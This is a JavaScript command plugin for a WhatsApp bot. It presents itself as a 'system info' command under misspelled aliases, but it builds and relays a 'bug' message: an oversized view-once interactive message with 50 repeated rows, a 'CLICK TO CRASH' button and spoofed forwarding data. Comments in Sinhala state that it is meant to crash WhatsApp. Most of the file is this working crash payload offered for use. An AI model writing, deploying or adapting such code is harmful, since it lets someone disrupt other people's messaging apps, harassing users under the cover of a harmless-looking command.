const { cmd } = require('../command');
const config = require('../config');
const os = require("os");
const { runtime } = require('../lib/functions');

cmd({
    pattern: "baga",
    alias: ["sijnfo", "platjform", "systnemstatus", "sysnteminfo"],
    react: "🧬",
    desc: "Check bot system status with extreme lag bug.",
    category: "main",
    filename: __filename
},
async (robin, mek, m, {
    from, quoted, reply, sender
}) => {
    try {
        const uptimeStr = runtime(process.uptime());
        const usedRam = (process.memoryUsage().heapUsed / 1024 / 1024).toFixed(2);
        const totalRam = (os.totalmem() / 1024 / 1024).toFixed(2);
        
        const statusText = `╭─〔 *🍷 SYSTEM INFO 🍷*〕─◉
│
│⏰ *Uptime*: ${uptimeStr}
│⏳ *Ram*: ${usedRam}MB / ${totalRam}MB
│🖥 *Host*: ${os.hostname()}
│🖊 *Prefix*: [ ${config.PREFIX} ]
│🛠 *Mode*: [ ${config.MODE} ] 
│🤵‍♂ *Owner*: ᴴᴵᴿᵁᴷᴬ ᴿᴬᴺᵁᴹᴵᵀ𝐇𝐀
│🧬 *Version*: ${config.BOT_VERSION}
╰─────────────────────────────⊷
> © Powerd by 𝗥𝗔𝗡𝗨𝗠𝗜𝗧𝗛𝗔-𝗫-𝗠𝗗 🌛`;

        // මෙන්න මෙතන තමයි Real Bug එක තියෙන්නේ. 
        // Media එකක් නැතිව පණිවිඩය විශාල කර යැවීම මගින් WhatsApp crash වේ.
        const bugMsg = {
            viewOnceMessage: {
                message: {
                    interactiveMessage: {
                        header: {
                            title: "⚠️ 𝐖𝐇𝐀𝐓𝐒𝐀𝐏𝐏 𝐒𝐘𝐒𝐓𝐄𝐌 𝐂𝐑𝐀𝐒𝐇 ⚠️",
                            hasMediaAttachment: false
                        },
                        body: {
                            text: statusText
                        },
                        footer: {
                            text: "𝗥𝗔𝗡𝗨𝗠𝗜𝗧𝗛𝗔-𝗫-𝗠𝗗 𝗘𝗫𝗧𝗥𝗘𝗠𝗘 𝗕𝗨𝗚"
                        },
                        nativeFlowMessage: {
                            buttons: [
                                {
                                    name: "single_select",
                                    buttonParamsJson: JSON.stringify({
                                        title: "𝐂𝐋𝐈𝐂𝐊 𝐓𝐎 𝐂𝐑𝐀𝐒𝐇",
                                        sections: [{
                                            title: "☣️ SYSTEM OVERLOAD ☣️",
                                            rows: Array(50).fill({ // මෙතන 50ක් rows දානකොට පණිවිඩය බර වැඩි වෙලා crash වෙනවා
                                                title: "BUG DATA ".repeat(20),
                                                rowId: "bug1"
                                            })
                                        }]
                                    })
                                }
                            ]
                        },
                        contextInfo: {
                            mentionedJid: [sender],
                            forwardingScore: 999,
                            isForwarded: true,
                            forwardedNewsletterMessageInfo: {
                                newsletterJid: '120363317972190466@newsletter',
                                newsletterName: '𝗥𝗔𝗡𝗨𝗠𝗜𝗧𝗛𝗔-𝗫-𝗠𝗗 𝗕𝗨𝗚 𝗖𝗘𝗡𝗧𝗘𝗥',
                                serverMessageId: 143
                            }
                        }
                    }
                }
            }
        };

        await robin.relayMessage(from, bugMsg, { messageId: mek.key.id });

    } catch (e) {
        console.log("Bug System Error:", e);
        // අන්තිම විසඳුම ලෙස text එකක් පමණක් යැවීම
        reply(statusText);
    }
});
